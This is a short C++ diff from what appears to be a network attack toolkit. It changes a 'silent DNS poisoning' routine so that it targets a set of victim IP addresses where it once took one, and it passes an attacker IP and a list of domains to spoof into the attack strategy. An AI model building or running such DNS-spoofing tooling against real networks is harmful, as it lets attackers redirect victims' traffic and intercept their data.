@@ -43,13 +43,21 @@ void ATK::DNS::silentPoison(const SilentPoisoningOptions &options) {
     }
 
     std::unique_ptr<ATK::DNS::SilentDnsPoisoningStrategy> strategy;
-    const pcpp::IPv4Address victimIp(options.victimIp);
     const pcpp::IPv4Address attackerIp(options.attackerIp);
+    std::unordered_set<pcpp::IPv4Address> victimIps;
+
+    for (const auto &ipStr : options.victimIps) {
+        victimIps.insert(pcpp::IPv4Address(ipStr));
+    }
+
+    if (victimIps.empty()) {
+        throw std::runtime_error("No victims provided");
+	}
     const std::unordered_set<std::string> domainsToSpoof(
         options.domainsToSpoof.begin(), options.domainsToSpoof.end());
     strategy = SilentDnsPoisoningStrategy::Builder(device)
-                   .victimIp(victimIp)
                    .attackerIp(attackerIp)
+                   .victimIps(victimIps)
                    .domainsToSpoof(domainsToSpoof)
                    .build();
 
